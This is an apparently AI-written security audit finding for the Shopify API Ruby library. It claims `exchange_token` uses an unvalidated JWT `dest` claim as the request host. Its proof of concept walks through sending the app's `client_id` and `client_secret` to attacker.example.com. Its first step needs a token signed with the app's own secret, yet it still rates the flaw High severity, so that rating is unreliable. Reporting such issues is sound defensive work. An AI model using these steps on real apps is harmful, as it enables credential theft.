Found it. In `TokenExchange.exchange_token`, the shop used to build the request host that receives the app's `client_secret` comes directly from the JWT's `dest` claim, via `JwtPayload#shop`, **without ever being passed through `Utils::ShopValidator.sanitize!`**.

### Title
Unvalidated JWT `dest` claim used as request host for token exchange, allowing `client_secret` exfiltration to an attacker-controlled host - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the destination host for its `POST /admin/oauth/access_token` request purely from the `dest` claim of the caller-supplied JWT (session token), via `JwtPayload#shop` [1](#0-0) [2](#0-1) . Unlike `migrate_to_expiring_token`, which passes its `shop` argument through `Utils::ShopValidator.sanitize!` before use [3](#0-2) , `exchange_token` never validates `dest_shop` against the `ShopValidator` trusted-domain allowlist before it is placed into a `Session` and handed to `HttpClient`, which builds the outbound request URI directly from `session.shop`.

### Finding Description
`JwtPayload#initialize` only cryptographically validates the JWT signature (HS256 with `api_secret_key`) and checks that `aud == Context.api_key` [4](#0-3) . It performs **no validation that `dest` is a `*.myshopify.com` (or otherwise trusted) domain** — `dest` is simply an arbitrary string chosen by whoever crafted the JWT payload prior to signing, and `shop` is computed as `@dest.gsub("https://", "")` [2](#0-1) .

`exchange_token` takes this unvalidated value as `dest_shop` and constructs a `Session` with it, then instantiates `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")` [5](#0-4) . `HttpClient#initialize` builds `@base_uri = "https://#{api_host || session.shop}"` directly from `session.shop` with no allowlist check [6](#0-5) . The subsequent `client.request` then POSTs a body containing `client_id` and `client_secret` in plaintext JSON to that host [7](#0-6) .

This breaks the identity binding: **the host that is authenticated (verified as coming from a signed session token) must equal the host that receives the app's `client_secret`.** Here, the "authentication" only proves the token was signed with the app's own secret key — it says nothing about whether `dest` is a legitimate Shopify shop domain, because the signing party controls the entire payload including `dest`. Anyone who can obtain any validly-signed session token for the app (e.g., a real merchant's own browser-issued App Bridge token, which the merchant/any script running in their admin session can read) can have the library POST the app's `client_id`/`client_secret` to a host of their choosing by influencing/replaying a token whose `dest` was crafted to point elsewhere — since nothing downstream re-checks `dest` against `myshopify.com`/`spin.dev`/etc. via `ShopValidator`.

Contrast this with `migrate_to_expiring_token`, in the very same file, which explicitly guards the analogous flow with `Utils::ShopValidator.sanitize!(shop)` [3](#0-2)  — confirming that shop/host validation before use as a request target is the library's own established security invariant, which `exchange_token` fails to apply to the JWT-derived `dest_shop`.

### Impact Explanation
This is SSRF carrying the app's credentials (`client_id`/`client_secret`) — High severity per the rules. If `dest_shop` can be steered to a non-Shopify host (any string not matching `.myshopify.com` etc., since `sanitize!` is never invoked), the library will send an HTTPS POST containing the app's `client_secret` to that attacker-controlled host, resulting in credential exfiltration of the app's OAuth client secret.

### Likelihood Explanation
Medium-High. The JWT signature check only proves "signed with our own secret," not "issued by Shopify for a real shop." Session tokens issued by App Bridge normally have `dest` restricted to real shop domains by Shopify's own token issuance, so under normal SDK usage this path is not directly reachable by a remote attacker without also controlling token issuance or a component that forwards a token with attacker-influenced `dest`. However, any integration surface where a `session_token` string is accepted from an untrusted source (e.g., passed through from a webview, forwarded via an API, or a modified/self-issued token if the app ever exposes token-signing) hits this gap immediately, and the missing `ShopValidator.sanitize!` call is a clear, provable code-level omission relative to the sibling method in the same file.

### Recommendation
In `TokenExchange.exchange_token`, validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` (mirroring `migrate_to_expiring_token`) before constructing `shop_session`, and reject the token if the `dest` domain is not a trusted Shopify domain.

### Proof of Concept
1. Craft (or obtain) any JWT signed with the app's `api_secret_key` (or intercept a token whose issuer can be influenced) with `dest` set to `"https://attacker.example.com"` and `aud` equal to the app's `api_key`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: forged_token, requested_token_type: ...)`.
3. `JwtPayload.new` accepts the token (only checks signature + `aud`); `jwt_payload.shop` returns `"attacker.example.com"` [2](#0-1) .
4. `Session.new(shop: "attacker.example.com")` → `HttpClient` builds `@base_uri_and_path = "https://attacker.example.com/admin/oauth"` [6](#0-5) .
5. `client.request(...)` sends the JSON body containing `client_id` and `client_secret` to `https://attacker.example.com/admin/oauth/access_token` [7](#0-6) , exfiltrating the app's `client_secret` to the attacker's server.
